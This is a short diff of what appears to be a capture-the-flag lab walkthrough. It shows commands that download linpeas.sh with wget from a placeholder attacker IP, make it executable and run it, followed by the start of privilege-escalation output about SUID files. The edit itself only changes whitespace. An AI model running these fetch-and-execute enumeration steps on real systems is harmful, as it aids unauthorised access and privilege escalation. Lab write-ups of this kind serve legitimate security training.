@@ -279,8 +279,7 @@ I want to wget get this file to /tmp directory, so I'll cd into that
 
 ```wget http://<YOUR_THM_IP>:8080/linpeas.sh```  
 ```chmod +x linpeas.sh```  
-```./linpeas.sh```
-
+```./linpeas.sh  ```
 ```
 ====================================( Interesting Files )=====================================
 [+] SUID - Check easy privesc, exploits and write perms
